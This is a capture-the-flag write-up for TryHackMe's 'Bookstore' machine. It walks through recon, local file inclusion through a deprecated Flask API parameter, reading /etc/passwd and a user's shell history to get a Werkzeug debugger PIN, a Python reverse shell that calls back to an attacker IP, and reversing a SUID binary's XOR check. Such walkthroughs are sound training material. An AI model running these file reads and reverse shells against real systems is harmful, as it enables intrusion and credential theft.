# Bookstore - TryHackMe

Linux machine running a Flask/Werkzeug REST API on port 5000 alongside a bookstore website
on port 80. The site's own JavaScript hints at a deprecated API version, which turns out to
carry a local file inclusion parameter. That LFI leaks a Werkzeug debugger PIN from a user's
shell history, which unlocks a Python console for remote code execution and a path to a
custom SUID binary gated by a reversible XOR check.

The target's IP changes across machine reboots - each command below uses the real IP from
the session it was run in.

---

## Reconnaissance

```bash
nmap -sV -sC 10.67.182.77
```

Three services: SSH (22, no credentials available, not used), Apache on port 80 (the
bookstore site), and Werkzeug/Python on port 5000 (a documented REST API at
`/api/v2/resources/books`, a PIN-protected `/console`, and a `robots.txt`).

---

## Enumeration

### Port 80 - the overlooked service

Fuzzing the API on port 5000 directly doesn't turn up anything: the documented `/api/v2`
parameters (`id`, `author`, `published`) are clean. The actual hint sits on the other web
service:

```bash
gobuster dir -u http://10.67.182.77 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

This reaches `/assets/js/api.js`, which contains a developer comment noting that the
previous version of the API had a vulnerable parameter.

### Fuzzing the deprecated API version

`/api/v1/resources/books` is still reachable. Fuzzing its parameter name with a fixed LFI
probe value, hiding the noise of 404 responses:

```bash
wfuzz -u "http://10.67.169.79:5000/api/v1/resources/books?FUZZ=.bash_history" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
```

The parameter is `show`.

---

## Exploitation - Local File Inclusion

```bash
curl 'http://10.64.132.206:5000/api/v1/resources/books?show=/etc/passwd'
```

confirms the inclusion. Reading the shell history of user `sid` the same way:

```bash
curl 'http://10.64.132.206:5000/api/v1/resources/books?show=.bash_history'
```

reveals the Werkzeug debugger PIN.

---

## Initial Access

The PIN unlocks `/console`, which runs arbitrary Python on the server. A reverse shell
through a raw socket, descriptor duplication, and a pty:

```bash
nc -lnvp 4444
```

```python
import socket,os,pty;s=socket.socket();s.connect(("10.67.107.184",4444));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn("/bin/sh")
```

Shell as `sid`, with the user flag in `sid`'s home directory.

---

## Privilege Escalation

A custom SUID binary, `try-harder`, sits in `sid`'s home directory. Serving it to the attack
box for analysis:

```bash
python3 -m http.server 8080
```

Decompiling it shows the `main` function reading a number, XORing it against two constants
(`0x1116` and `0x5db3`), and comparing the result to `0x5dcd21f4`. XOR is its own inverse, so
the expected input is the target value XORed with the same two constants:

```python
>>> 0x5dcd21f4 ^ 0x1116 ^ 0x5db3
1573743953
```

Running `./try-harder` with that value opens a root shell, with the root flag under
`/root/root.txt`.

---

## Key Takeaways

- The service that looks like the real target can absorb all the attention while the actual
  hint sits on a different port - every web service is worth enumerating in full, frontend
  JavaScript included, before going deep on just one.
- A versioned API is worth probing on its older, deprecated versions too: the current one
  can be clean while a still-reachable previous version carries the vulnerable parameter.
- A custom SUID binary that compares input against a constant after a reversible operation
  (XOR) can be solved algebraically instead of brute-forced: if `A XOR B XOR C = D`, then
  `A = D XOR B XOR C`.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were
performed strictly for educational purposes.
